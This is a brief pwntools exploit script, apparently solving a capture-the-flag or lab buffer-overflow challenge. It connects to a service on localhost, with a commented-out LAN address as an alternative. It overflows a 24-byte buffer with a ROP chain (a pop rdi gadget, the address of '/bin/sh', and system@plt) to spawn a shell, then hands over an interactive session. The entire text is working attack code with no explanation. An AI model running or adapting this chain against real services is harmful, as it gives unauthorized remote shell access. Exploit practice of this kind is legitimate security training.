from pwn import *
rhp = {'host': "localhost", 'port': 34567}
# rhp = {'host': '192.168.33.20', 'port':1234}

pop_rdi = p64(0x00400683)
bin_sh = p64(0x00601048)
system_plt = p64(0x400490)

conn = remote(rhp['host'], rhp['port'])

log.info(conn.recv()) 

payload = b"a" * 24 + pop_rdi + bin_sh + system_plt
conn.sendline(payload)
conn.interactive()
